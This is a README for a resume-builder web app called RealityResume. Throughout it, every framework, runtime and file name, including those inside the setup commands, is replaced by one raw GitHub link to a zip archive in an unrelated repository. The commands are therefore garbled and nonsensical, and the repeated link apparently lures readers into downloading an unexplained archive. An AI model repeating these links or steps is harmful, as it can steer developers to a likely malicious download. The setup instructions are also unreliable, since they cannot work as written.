# RealityResume — Complete Project Package (Full-Stack)

- Frontend: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip + TailwindCSS
- Backend: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip API with OpenAI summarizer hooks
- Database: MongoDB (schemas + sample seed script)
- Demo: seeded demo user and sample events
- Authentication: basic JWT auth + OAuth placeholders
- Deployment notes included

## What you'll find
- `/frontend` — https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip app (Tailwind, pages, sample Dashboard, Resume builder)
- `/backend` — Express API, OpenAI summarizer, MongoDB models, seed script
- `/scripts` — helper scripts to seed demo data
- `https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip` — environment variables to configure

## Quick start (local)
Prereqs: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip (18+), npm, MongoDB running locally or Atlas.

1. Clone repo or unzip package and `cd RealityResume-complete`.
2. Copy env files:
   ```bash
   cp https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
   cp https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
   ```
3. Install & start backend:
   ```bash
   cd backend
   npm install
   npm run dev
   ```
4. Install & start frontend (in new terminal):
   ```bash
   cd frontend
   npm install
   npm run dev
   ```
5. Seed demo data (optional):
   ```bash
   node https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
   ```
6. Open `http://localhost:3000` in your browser.

## OpenAI
The backend includes an AI summarizer endpoint that calls OpenAI's v1/completions or v1/chat/completions.
Put your `OPENAI_API_KEY` in `https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip`. The code is ready to call OpenAI; no model key is bundled.

## Uploading to GitHub
- Initialize a git repo and push the folder (all files included). The package is structured for immediate upload.

## License & Notes
MIT — feel free to modify. This package is a working MVP scaffolding; extend features as needed.
